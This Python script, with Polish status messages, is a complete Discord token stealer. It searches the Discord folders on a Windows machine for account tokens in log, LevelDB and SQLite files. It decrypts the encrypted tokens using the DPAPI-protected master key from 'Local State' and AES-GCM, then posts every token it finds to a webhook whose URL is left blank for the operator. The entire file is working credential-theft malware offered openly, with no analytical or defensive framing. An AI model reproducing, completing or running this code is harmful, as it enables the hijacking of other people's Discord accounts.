import os
import re
import json
import sqlite3
import requests
import base64
import win32crypt
from Crypto.Cipher import AES  
import glob

WEBHOOK_URL = ""


PATHS = {
    "Discord AppData": os.path.join(os.getenv("APPDATA"), "Discord"),
    "Discord LocalAppData": os.path.join(os.getenv("LOCALAPPDATA"), "Discord"),
    "Discord ProgramFiles": os.path.join(os.getenv("PROGRAMFILES"), "Discord"),
    "Discord ProgramFiles(x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Discord"),
}

TOKEN_REGEX = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^\"]+"

def get_master_key():
    try:
        with open(os.path.join(os.getenv("APPDATA"), "Discord", "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Błąd przy pobieraniu klucza głównego: {e}")
        return None

def decrypt_token(encrypted_token, key):
    try:
        encrypted_token = base64.b64decode(encrypted_token)
        iv = encrypted_token[3:15]
        payload = encrypted_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        print(f"Błąd przy deszyfrowaniu tokenu: {e}")
        return None

def deep_scan(path):
    found_tokens = []
    
    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            
         
            if os.path.getsize(file_path) > 10 * 1024 * 1024:  # >10MB
                continue
                
            try:
              
                if file.endswith((".log", ".ldb", ".txt", ".json")):
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        matches = re.findall(TOKEN_REGEX, content)
                        if matches:
                            print(f"Znaleziono potencjalne tokeny w: {file_path}")
                            found_tokens.extend(matches)
              
                elif file.endswith((".sqlite", ".db", ".leveldb")):
                    try:
                        conn = sqlite3.connect(f"file:{file_path}?mode=ro", uri=True)
                        cursor = conn.cursor()
                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                        tables = cursor.fetchall()
                        
                        for table in tables:
                            try:
                                cursor.execute(f"SELECT * FROM {table[0]};")
                                for row in cursor.fetchall():
                                    for field in row:
                                        if isinstance(field, str):
                                            matches = re.findall(TOKEN_REGEX, field)
                                            if matches:
                                                print(f"Znaleziono token w bazie danych {file_path}, tabela {table[0]}")
                                                found_tokens.extend(matches)
                            except:
                                continue
                        conn.close()
                    except:
                        continue
                    
            except Exception as e:
                print(f"Błąd przy analizie pliku {file_path}: {e}")
                continue
                
    return list(set(found_tokens))

def main():
    print("Rozpoczynam skanowanie...")
    master_key = get_master_key()
    all_tokens = []
    
    for name, path in PATHS.items():
        if not os.path.exists(path):
            print(f"Ścieżka nie istnieje: {name}")
            continue
            
        print(f"\n[*] Skanuję lokalizację: {name}...")
        tokens = deep_scan(path)
        
       
        if master_key and tokens:
            decrypted = []
            for token in tokens:
                if token.startswith("dQw4w9WgXcQ:"):
                    decrypted_token = decrypt_token(token.split(":")[1], master_key)
                    if decrypted_token:
                        print(f"Odszyfrowano token: {decrypted_token[:10]}...")
                        decrypted.append(decrypted_token)
                else:
                    decrypted.append(token)
            tokens = decrypted
            
        if tokens:
            print(f"[+] Znaleziono w {name}: {len(tokens)} tokenów")
            all_tokens.extend(tokens)

    if all_tokens:
        print("\n[!] Podsumowanie znalezionych tokenów:")
        for i, token in enumerate(all_tokens, 1):
            print(f"{i}. {token[:15]}...{token[-15:]}")
        
        print("\n[!] Wysyłam znalezione tokeny...")
        try:
            response = requests.post(WEBHOOK_URL, json={"content": f"Znalezione tokeny:\n{all_tokens}"}, timeout=10)
            if response.status_code == 200:
                print("Tokeny zostały wysłane pomyślnie")
            else:
                print(f"Błąd przy wysyłaniu: {response.status_code}")
        except Exception as e:
            print(f"Błąd przy wysyłaniu na webhook: {e}")
    else:
        print("\n[-] Nie znaleziono żadnych tokenów")

if __name__ == "__main__":
    main()
